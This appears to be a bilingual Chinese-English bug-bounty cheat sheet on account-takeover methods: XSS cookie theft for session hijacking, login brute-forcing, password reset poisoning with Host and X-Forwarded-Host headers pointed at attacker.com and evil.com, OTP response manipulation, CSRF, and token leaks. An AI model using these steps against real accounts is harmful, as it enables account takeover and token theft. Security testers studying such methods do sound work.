
## 使用 XSS 链接会话劫持 - Chaining Session Hijacking with XSS
```
1.我在断开的身份验证和会话管理中添加了会话劫持方法。
2.如果你找到了目标。
3.无论如何都要尝试窃取该目标上的cookie。
4.这里我说的是寻找 xss 。
5.如果你发现xss你可以窃取受害者的cookies并使用会话劫持你可以接管受害者的帐户。

1.I have add a session hijacking method in broken auth and session managment. 
2.If you find that on target.
3.Try anyway to steal cookies on that target.
4.Here I am saying look for xss .
5.If you find xss you can stole the cookies of victim and using session hijacking you can takeover the account of victim.
```
##  使用弱密码策略登录没有速率限制 - No Rate Limit On Login With Weak Password Policy
```
因此，如果您发现目标具有弱密码策略，请尝试通过为您的帐户创建非常弱的密码来尝试在 poc 节目中进行无速率限制攻击。

（可能会或可能不会被接受）

So if you find that target have weak password policy try to go for no rate limit attacks in poc shows by creating very weak password of your account.

(May or may not be accepted)
```
## 密码重置中毒导致令牌被盗-Password Reset Poisoning Leads To Token Theft
```
1.进入密码重置功能。
2.输入邮箱，拦截请求。
3.将主机头更改为其他主机，即
    Host:target.com
    Host:attacker.com
  还尝试在不更改主机的情况下添加一些标头，例如
    X-Forwarded-Host: evil.com
    Referrer: https://evil.com
4.如果您发现在下一个请求中，attacker.com 表示您成功窃取了令牌，请转发此信息。:) 

1.Go to password reset funtion.
2.Enter email and intercept the request.
3.Change host header to some other host i.e,
    Host:target.com
    Host:attacker.com
  also try to add some headers without changing host like
    X-Forwarded-Host: evil.com
    Referrer: https://evil.com
4.Forward this if you found that in next request attacker.com means you successfully theft the token.:)
```
## 使用身份验证绕过 - Using  Auth Bypass
```
查看 Auth Bypass 方法，有一种通过响应操作绕过 otp(One Time Password,一次性密码) 的方法，这可能导致帐户接管。

Check out Auth Bypass method, there is a method for otp bypass via response manipulation this can leads to account takeovers.
```
## 尝试启用 CSRF  - Try For CSRF On
```
1.更改密码功能。
2.邮箱变更
3.更改安全问题

1.Change Password function.
2.Email change
3.Change Security Question
```
## 令牌泄漏响应 - Token Leaks In Response

* 有多种方法可以做到，但都是一样的 - So there are multiple ways to do it but all are same.

* 所以我将在这里分享我学到的方法 - So I will sharing my method that I have learnt here .

* 端点:(注册，忘记密码) - Endpoints:(Register,Forget Password)

* 步骤(注册): - Steps(For Registration):
```
1.为了注册拦截包含您输入的数据的注册请求。
2.点击执行 -> do -> 拦截对此请求的响应。
3.点击前进。
4.检查包含任何链接、任何令牌或otp的响应。

1.for registeration intercept the signup request that contains data you have entered.
2.Click on action -> do -> intercept response to this request.
3.Click forward.
4.Check response it that contains any link,any token or otp.
```
------------------------
 * 步骤(密码重置): - Steps(For password reset):
 ``` 
1.拦截忘记密码选项。
2.点击操作 -> 做 -> 拦截对此请求的响应。
3.点击前进。
4.检查包含任何链接、任何令牌或otp的响应。

1.Intercept the forget password option.
2.Click on action -> do -> intercept response to this request.
3.Click forward.
4.Check response it that contains any link,any token or otp.
 ```

## 参考：
* Various Source From Google,Twitter,Medium

## 作者

* [@Virdoex_hunter](https://twitter.com/Virdoex_hunter)
